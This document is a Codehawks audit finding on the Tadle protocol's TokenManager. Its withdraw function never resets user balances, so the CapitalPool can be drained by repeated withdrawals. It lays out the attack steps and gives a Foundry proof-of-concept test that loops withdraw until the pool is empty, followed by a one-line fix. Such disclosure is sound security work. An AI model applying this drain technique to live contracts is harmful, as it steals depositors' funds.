---
tags:
  - lang/solidity
  - sector/lending
  - sector/nft
  - sector/options
  - platform/codehawks
  - has/github
  - severity/high
  - impact/loss-of-funds/direct-drain
protocol: "[[Tadle]]"
auditors:
  - "[[inzinko]]"
genome:
  - "[[wrong-condition]]"
  - "[[direct-drain]]"
  - "[[access-roles]]"
  - "[[cross-contract-state-consistency]]"
  - "[[liquidation-underwater]]"
  - "[[oracle-freshness]]"
---
# TokenManager - Unlimited withdraw

- id: 38060
- impact: HIGH
- protocol: [[Tadle]]
- reporter: inzinko (Codehawks)
- source: N/A

## Summary


The TokenManager contract has a bug that allows users to withdraw an unlimited amount of tokens from the CapitalPool contract. This means that users can steal funds from other users by repeatedly withdrawing tokens without their balances being updated. This vulnerability was found through manual auditing and can be demonstrated through a unit test. To fix this issue, the value in the `userTokenBalanceMap` needs to be updated in the `withdraw` function. This bug is critical as it allows all funds to be withdrawn from the CapitalPool contract. 

## Details

## Summary

Due to the fact that the `withdraw` function from the `TokenManager` contract does not reset users' balances after withdrawals, users can repeat withdrawals from the contract an unlimited number of times, thus stealing funds from other users.

## Vulnerability Details

In the `withdraw` function of the `TokenManager` contract, it is possible to unlimitedly withdraw tokens from the `CapitalPool` contract.

The `withdraw` function allows any user to withdraw tokens they have earned on their balance, but the user's balance is not updated anywhere after the withdrawal.

The [code](https://github.com/Cyfrin/2024-08-tadle/blob/04fd8634701697184a3f3a5558b41c109866e5f8/src/core/TokenManager.sol#L141) for getting the user's balance:

```Solidity
uint256 claimAbleAmount = userTokenBalanceMap[_msgSender()][
            _tokenAddress
        ][_tokenBalanceType];
```

As an example, let's consider the simplest scenario of an attack on a system that will exploit the found vulnerability:

1. First, the user needs to make it so that they have some sort of balance within the `TokenManager` contract.
   1. To do this, it is enough to create an offer using the `createOffer` function of the `PreMarkets` contract. During creation, the user will send some tokens as a collateral.
   2. Then it is necessary to abort the offer immediately using the `abortAskOffer` function of the `PreMarkets` contract. This abort will add a refund amount to the user's balance in the `TokenManager` contract.
2. Send a huge number of transactions, within which there will be a call to the `TokenManager` contract `withdraw` function. The number of transactions will depend on how many tokens are inside the `CapitalPool` contract.

This is the simplest attack option, but it is possible to create a special contract on whose behalf to interact with the protocol. Then the attack can be accomplished in a single transaction, which will be much more efficient.

### Test code that demonstrates the vulnerability described above

To run the test, its code without changes should be placed in the **PreMarkets.t.sol** file.

```Solidity
function test_unlimited_withdraw() public {
        vm.startPrank(user);

        capitalPool.approve(address(mockUSDCToken));

        uint256 userPaidAmount = 12000 * 1e18;

        preMarktes.createOffer(
            CreateOfferParams(
                marketPlace,
                address(mockUSDCToken),
                10000,
                10000 * 1e18,
                12000,
                300,
                OfferType.Ask,
                OfferSettleType.Turbo
            )
        );
        vm.stopPrank();

        assertEq(mockUSDCToken.balanceOf(address(capitalPool)), userPaidAmount);

        vm.startPrank(user2);

        uint256 user2PaidAmount = 120 * 1e18;

        preMarktes.createOffer(
            CreateOfferParams(
                marketPlace,
                address(mockUSDCToken),
                10000,
                100 * 1e18,
                12000,
                300,
                OfferType.Ask,
                OfferSettleType.Turbo
            )
        );

        assertEq(mockUSDCToken.balanceOf(address(capitalPool)), userPaidAmount + user2PaidAmount);

        address user2OfferAddr = GenerateAddress.generateOfferAddress(1);
        address user2StockAddr = GenerateAddress.generateStockAddress(1);

        preMarktes.abortAskOffer(user2StockAddr, user2OfferAddr);

        assertEq(tokenManager.userTokenBalanceMap(user2, address(mockUSDCToken), TokenBalanceType.MakerRefund), user2PaidAmount);

        uint256 user2BalanceBefore = mockUSDCToken.balanceOf(user2);

        for (uint256 i = 0; i < 101; i++) {
            tokenManager.withdraw(address(mockUSDCToken), TokenBalanceType.MakerRefund);
        }

        assertEq(mockUSDCToken.balanceOf(address(capitalPool)), 0);
        assertEq(mockUSDCToken.balanceOf(user2) - user2BalanceBefore, userPaidAmount + user2PaidAmount);

        vm.stopPrank();
    }
```

## Impact

It is possible to withdraw absolutely all funds from CapitalPool contract, so this bug is critical.

## Tools Used

The bug was found by manually auditing the contract code. To validate the vulnerability and demonstrate it, a unit test was written.

## Recommendations

Update value in `userTokenBalanceMap` inside `withdraw` function.
